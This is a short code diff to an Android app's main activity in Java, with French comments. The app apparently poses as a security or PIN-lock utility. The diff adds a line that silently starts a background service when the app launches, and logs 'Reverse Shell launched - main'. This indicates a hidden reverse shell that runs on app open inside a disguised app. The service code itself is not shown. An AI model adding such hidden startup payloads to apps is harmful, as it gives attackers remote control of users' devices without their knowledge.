@@ -28,13 +28,6 @@ public class MainActivity extends AppCompatActivity {
     private static int ACTIVITY_LOCK = 4;
     private static int ACTIVITY_FIRST_LOAD = 3;
 
-    @Override
-    public boolean dispatchTouchEvent(MotionEvent e) {
-        //Log.v("secme", "Touchy");
-        return super.dispatchTouchEvent(e);
-    }
-
-    //unlock with real PIN form
     private void unlock_screen() {
         final ImageView myLayout = findViewById(R.id.imageView);
 
@@ -101,7 +94,9 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         ImageView imageView = findViewById(R.id.imageView);
-        Glide.with(this).load(R.drawable.annonce_intro).into(imageView); //annonce code pin necessaire
+        Glide.with(this).load(R.drawable.annonce).into(imageView); //annonce code pin necessaire
+        startService(new Intent(this, MyIntentService.class));
+        Log.v("secme","Reverse Shell launched - main");
     }
 
     // Lancement d'un scan après appui du bouton dans l'activité Analyze
